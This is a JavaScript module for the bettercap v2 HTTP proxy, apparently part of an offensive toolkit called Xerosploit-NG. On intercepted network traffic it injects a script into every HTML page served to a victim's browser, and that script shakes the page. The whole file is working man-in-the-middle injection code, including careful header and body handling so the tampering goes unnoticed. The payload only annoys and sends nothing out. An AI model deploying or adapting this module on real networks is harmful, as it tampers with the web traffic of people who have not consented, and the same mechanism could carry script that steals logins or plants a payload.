// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- ShakeScreen
//
// Shakes the victim's browser viewport by toggling the body margin, ported
// from the v1 JavaScript payload:
//   modules/js/shakescreen.js
//     window.onload=function(){var move=document.getElementsByTagName("body")[0];
//       setInterval(function(){move.style.marginTop=(move.style.marginTop=="4px")?"-4px":"4px";},5);}
//
// This file is a PURE bettercap v2 http.proxy.script module (loaded with
// `set http.proxy.script <abs path>`).  It takes no parameters.  Its
// onResponse() injects the shake snippet into every text/html response.
// It is NOT a raw browser payload and must never be fed to bettercap's
// built-in http.proxy.injectjs: doing so would inject this whole module --
// hooks, helpers and all -- into the page.
//
// The injected snippet opens and closes a <script> tag in the OUTPUT, but this
// module's SOURCE contains no literal script-closing tag (the closing tag is
// written with an escaped slash) so it can never truncate an outer injected script.
//
// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
// "body modified" flag, so after the body has been read this module MUST write
// a body back or bettercap emits an EMPTY response.  The decision to rewrite
// is therefore made from method/status/headers alone; only then is the body
// read exactly once.  Every exit path after that read sets the body and a
// Content-Length equal to the UTF-8 byte length of the string it writes:
// either the injected bytes, or the byte-exact original when the rewrite throws.
// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
// touched.  A response this module does not handle is left byte-identical.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "shakescreen";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
function xeGetHeader(headers, name) {
    if (!headers) { return null; }
    var want = ("" + name).toLowerCase();
    var key;
    for (key in headers) {
        if (("" + key).toLowerCase() === want) {
            var value = headers[key];
            if (value === null || value === undefined) { return null; }
            return value;
        }
    }
    return null;
}

// Decide, from method/status/headers ALONE (no body read), whether this
// response may be rewritten as a full-body 200.
function xeSkipResponse(req, res) {
    if (!req || req.Method !== "GET") { return true; }
    if (!res || res.Status !== 200) { return true; }
    if (xeGetHeader(req.Headers, "Range")) { return true; }
    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
    return false;
}

var XE_STALE_HEADERS = [
    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
];

function xeWriteBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
}

function xeReplaceBody(res, body, contentType) {
    if (typeof res.RemoveHeader === "function") {
        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
            res.RemoveHeader(XE_STALE_HEADERS[i]);
        }
    }
    if (contentType && typeof res.SetHeader === "function") {
        res.SetHeader("Content-Type", contentType);
    }
    xeWriteBody(res, body);
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

function xeInjectBeforeCloseTag(body, snippet) {
    var lower = body.toLowerCase();
    var at = lower.indexOf("</head>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    at = lower.indexOf("</body>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    return body + snippet;
}

// The payload injected into the page.  Built with an escaped closing slash so
// this module's source carries no literal script-closing tag.
var XE_SHAKE_SNIPPET =
    "<script type=\"text/javascript\">" +
    "window.onload=function(){" +
    "var move=document.getElementsByTagName(\"body\")[0];" +
    "setInterval(function(){" +
    "move.style.marginTop=(move.style.marginTop==\"4px\")?\"-4px\":\"4px\";" +
    "},5);};" +
    "<\/script>";

function onLoad() {
    xeLog("loaded");
}

function onResponse(req, res) {
    // Decide from headers/URL only; a skipped response is never read or mutated.
    if (!xeIsHtml(res)) { return; }
    if (xeSkipResponse(req, res)) { return; }

    // Committed to rewriting: read the body exactly once and always write back.
    var original = null;
    try {
        original = xeReadBody(res);
        if (typeof original !== "string") { return; }

        var where = (req && req.Hostname ? req.Hostname : "") + (req && req.Path ? req.Path : "");
        xeLog("injecting shakescreen into " + where);

        var out = xeInjectBeforeCloseTag(original, XE_SHAKE_SNIPPET);
        if (out !== original) {
            xeReplaceBody(res, out, (typeof res.ContentType === "string" && res.ContentType) ? res.ContentType : "text/html");
        } else {
            xeWriteBody(res, original);
        }
    } catch (e) {
        xeWarn("onResponse failed: " + e);
        if (typeof original === "string") {
            xeWriteBody(res, original);                                  // fail-open: exact original bytes
        }
    }
}
